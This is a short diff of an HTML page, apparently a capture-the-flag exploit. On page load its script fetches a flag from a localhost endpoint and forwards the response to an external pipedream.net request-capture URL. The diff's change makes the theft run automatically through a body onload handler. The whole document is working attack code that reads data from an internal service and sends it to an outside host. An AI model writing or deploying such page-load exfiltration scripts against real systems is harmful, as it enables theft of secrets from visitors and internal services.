@@ -2,11 +2,14 @@
   <head>
     <title>Prova</title>
     <script>
-      fetch("http://localhost/get_flag.php").then(r => {
+      function test(){
+        fetch("http://localhost/get_flag.php").then(r => {
         if (r.ok) {
           return r.json();
         }
       }).then(d => fetch("https://enahomwjmoi9k.x.pipedream.net/" + d).then(r2 => console.log(r2)));
+      }
     </script>
   </head>
+  <body onload="test();"></body>
 </html>
